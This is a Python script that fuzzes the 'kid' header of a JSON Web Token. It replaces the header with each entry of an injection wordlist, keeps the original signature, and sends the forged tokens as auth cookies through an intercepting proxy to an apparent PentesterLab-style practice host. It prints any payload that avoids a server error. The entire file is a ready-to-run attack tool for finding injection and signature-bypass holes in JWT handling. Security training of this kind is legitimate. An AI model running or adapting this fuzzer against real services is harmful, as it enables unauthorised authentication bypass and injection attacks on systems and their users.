import jwt
import json
from codecs import encode, decode
import requests
import hashlib
import hmac
import base64
from os import listdir
from os.path import isfile, join
import copy

print("----- PARAMS -----")

proxies = {
  'http': 'http://192.168.68.103:8080',
  'https': 'http://192.168.68.103:8080',
}
print (proxies)
injections = open('/wordlists/Injections/All_attack.txt', 'r').readlines()

jwt_before = open('data/jwt.json', 'r').read()
print (jwt_before)

print("----- PARSE -----")

# create an appropriate JSON object for header
header_before = jwt.get_unverified_header(jwt_before)
print(header_before)

parts_before = jwt_before.split('.')
payload_before = parts_before[1]
signature_before = parts_before[2]

print("----- BRUTE -----")

def create_token(kid):
    # create an appropriate JSON object for header
    header = copy.deepcopy(header_before)
    header['kid'] = kid
    header = json.dumps(header).encode()
    header = base64.urlsafe_b64encode(header).rstrip(b"=")

    # print the json token (using the original signature, to fuzz and detect injection opportunities)
    encoded = '{}.{}.{}'.format(header.decode(), payload_before, signature_before)

    # TODO: You could then update the signature using a predictable signature key value, but it's prob easier to use jwt.io to do that part
    #       and inject it manually in the browser
    
    return encoded

def send_http(token):
    headers = {
        'Host': 'ptl-b82c80ac-bf650f60.libcurl.so',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'close',
        'Cookie': 'auth=' + token
    }
    response = requests.get(
        'http://ptl-b82c80ac-bf650f60.libcurl.so/',
        params=None,
        headers=headers,
        proxies=proxies
    )
    return response.status_code

# Sample
send_http(jwt_before)

# Try all injections
for injection in injections:
    # Clean wordlist a bit...
    injection = injection.strip('\n')
    if injection is None or injection == "":
        continue
    # Generate JWT
    token = create_token(injection.strip('\n'))
    status = send_http(token)
    if status != 500:
        print(injection)
        print(token)
        print(status)
        print("")